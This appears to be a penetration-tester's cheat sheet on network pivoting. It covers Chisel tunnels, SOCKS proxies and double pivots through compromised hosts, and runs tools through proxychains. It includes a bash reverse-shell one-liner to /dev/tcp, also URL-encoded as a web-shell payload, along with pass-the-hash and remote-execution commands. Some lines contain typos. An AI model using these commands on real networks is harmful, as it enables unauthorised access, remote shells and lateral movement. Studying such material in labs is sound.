# Pivoting / Network

## Pivoting, Tunneling, and Port Forwarding

### Chisel Basic

Reverse Port Forwarding (Remote Port Forwarding)

```bash
# From Kali, I want to access to a service (port 8001) on a compromised target machine. 

# Kali
./chisel server --port 9999 --reverse &

# Target Machine            (R:(kali-ip:)kali-port:target-ip:port)
./chisel client Kali-ip:9999 R:8001:127.0.0.1:8001 &

# Kali
Connect(Browse,etc.) to 127.0.0.1:8001 on Kali
```

Port Forwarding (Local Port Forwarding)

```bash
# From Kali, I want to access to a service (port 8001) on a compromised target machine. 

# Target Machine
./chisel server --port 9999 --socks5 &

# Kali                         (kali-ip:kali-port:target-ip:target-port)
./chisel client Target-ip:9999 127.0.0.1:8001:127.0.0.1:8001 &

# Kali
Connect(Browse,etc.) to 127.0.0.1:8001 on Kali
```

Reverse Dynamic SOCKS Proxy

```bash
# From Kali, I want to access to remote netowrk machine (through target machine as a jumpbox).

# Kali
./chisel server --port 9999 --reverse &

# Target Machine             (R:kali-ip:kali:port:socks)
./chisel client Kali-ip:9999 R:127.0.0.1:5000:socks & # This will open 127.0.0.1:5000 on Kali as a reverse SOCKS proxy.

# Kali
sudo vi /etc/proxychanins4.conf
socks5 127.0.0.1 5000

sudo proxychains nmap -Pn --top-ports=20 -sT target-ip

# For browser
Add 'socks5' to proxy type and localhost ip address (127.0.0.1) and port (1080 by default, 5000 for above, or whatever you set) in foxyproxy config. 
```

Forward Dynamic SOCKS Proxy

```bash
# From Kali, I want to access to remote netowrk machine (through target machine as a jumpbox). 

# Target Machine 
./chisel server --port 9999 --socks5 &

# Kali                         (kali-ip:kali-port:socks)
./chisel client target-ip:9999 127.0.0.1:5000:socks & # This will open 127.0.0.1:5000 on Kali as a reverse SOCKS proxy.

# Kali
sudo vi /etc/proxychanins4.conf
socks5 127.0.0.1 5000

sudo proxychains nmap -Pn --top-ports=20 -sT target-ip

# For browser
Add 'socks5' to proxy type and localhost ip address (127.0.0.1) and port (1080 by default, 5000 for above, or whatever you set) in foxyproxy config. 
```

### Chisel Tips

Port Forwarding (Local Port Forwarding) - External Access

```bash
# From target, I want to access to external URL through kali.

# Kali
./chisel server --port 9000 &

# Target Machine
./chisel client kali-ip:9000 9001:www.exploit-db.com:443 &

# Target Machine
wget https://127.0.0.1:9001
```

Reverse Dynamic SOCKS Proxy - Very simple configuration

```bash
# From Kali, I want to access to a remote network machine via a compromised target. 

# Kali
./chisel server --port 9000 --reverse &

# Target Machine            (R:(kali-ip:kali-port):socks)
./chisel client Kali-ip:9000 R:socks & # Kali will listen on default port 1080, which is SOCKS5 proxy through chisel client

# Kali
# check /etc/proxychains.conf that you have 'socks 127.0.0.1 1080' in the config.
```

Reverse Port Forwarding - Two ports forwarding

```bash
# From Kali, I want to access to two services (88 and 389) via a compromised target. 

# Kali
./chisel server --port 9000 --reverse &

# Target Machine            (R:(kali-ip):kali-port:target-ip:target-port)
./chisel client Kali-ip:9000 R:88:127.0.0.1:88 R:389:127.0.0.1:389 &

# Kali
Connect(Browse,etc.) to 127.0.0.1:88 or 127.0.0.1:389 on Kali
```

Reverse Port Forwarding - Double pivot

```bash
# From Kali, I want to access to a remote network machine (2 hops away) via a compromised target. 
# `Kali` --> `dmz01` --> `DC01` --> `MGMT01`

# Kali
./chisel server --socks5 -p 9001 --reverse &

# dmz01
./chisel client kali-ip:9001 R:9999:socks &
./chisel server -p 9002 --reverse --socks5 &

# DC01
chisel.exe client dmz01-ip:9002 R:8888:socks &

# Kali
sudo vi /etc/proxychains.conf
socks5 127.0.0.1 9999
socks5 127.0.0.1 8888
# Remove any socks4 connection

# socks4 127.0.0.1 9050 

sudo proxychains nmap -sT -p 22 MGMT01-ip

# For browser
Add 'socks5' to proxy type and localhost ip address (127.0.0.1) and port (9999 and 8888 for above, or whatever you set) in foxyproxy config. 

```

Some uncommon network situation such as a docker with mutiple IP addresses that not being connected from one IP address back to Kali machine, but can be connected to one of the IP addresses on the target machine - see below.

{% code overflow="wrap" %}
```bash
# https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
# https://www.youtube.com/watch?v=Yp4oxoQIBAM

# Configure normal reverse proxy tunnel 
# Configure reverse proxy first to connect 172.19.0.3:80 (Web servier)

# Kali
./chisel server -p 8000 --reverse

# Target @ 172.18.0.2 and 172.19.0.4 to connect to 172.19.0.3 
./chisel client kali-ip:8000 R:127.0.0.1:8001:172.19.0.3:80 

# Kali 
curl 10.0.0.1:8001 # Access to 172.19.0.3:80 

# Then, do another reverse proxy to connect 172.19.0.2:6379 (Database server)

# Target @ 172.18.0.2 and 172.19.0.4 to connect to 172.19.0.2  
./chisel client kali-ip:8000 R:127.0.0.1:6379:172.19.0.2:6379

# Kali 
nmap -sT -p 6379 -sC -sV locahost 

# Upgrade Web Shell to Reverse Shell
# Configure local proxy to access to the machine where the machine cannot connect back to Kali

# Target @ 172.18.0.2 and 172.19.0.4, my port 9002 connection will be forwarded to your kali's localhost port 8005.
./chisel client kali-ip:8000 9002:127.0.0.1:8005

# Kali
nc -nlvp 8005

# Target - This command should be executed at the box on 172.19.0.3. I will connect from 172.19.0.3 to 172.19.0.4 on port 9002. (then the above chisel client will forward to the Kali localhost port 8005, where netcat listener will be captured.)
# such as BURP in cmd=bash+-c+"bash+-i+>%26+/dev/tcp/172.19.0.4/9002+0>%261 in Repeater. 
bash -c "bash -i >& /dev/tcp/172.19.0.4/9002"
```
{% endcode %}

```bash
# This is the case we use Sock proxy for Double pivoting
# Kali socks (127.0.0.1:1080) -> 127.0.0.1:8001 -> 10.10.x.x.8000 -> Traget 172.19.0.3:client port -> 172.19.0.3:1337 -> socks 

# Kali 
./chisel server -p 8000 --reverse 

# Target
./chisel client 10.10.x.x:8000 R::8001:127.0.0.1:1337 

# Target
./chisel server -p 1337 --socks5

# Kali 
./chisel client 127.0.0.1:8001 socks 

# Kali
Proxychains nmap 172.19.0.3         
Proxychains redis-cli -h 127.19.0.2 # A different IP address
```

### Proxychain applications

```bash
sudo proxychains nmap -sC -sV target-ip
sudo proxychains ssh user@target-ip
sudo proxychains mysql -u dbuser -h target-ip
sudo proxychains impacket-smbexec domain\user:password target-ip
sudo proxycyains impacket-smbexec -hashes a1b2c3d4e5f6g7h8i9j10k11l12m13n14 target-ip -no-pass -command 'ipconfig'
sudo proxychains evil-winrm -i target-ip -u 'domain\user' -p 'password'
sudo proxychains xfreerdp /d:sandbox /u:alex /v:target-ip +clipboard
sudo proxychains python exploit.py http://target-ip/clipper/ admin password
sudo proxychains msfconsole
...
```

### SSH

```bash
# TBD

```

### Meterpreter

```bash
# https://cocomelonc.github.io/pentest/2021/11/08/pivoting-2.html
```
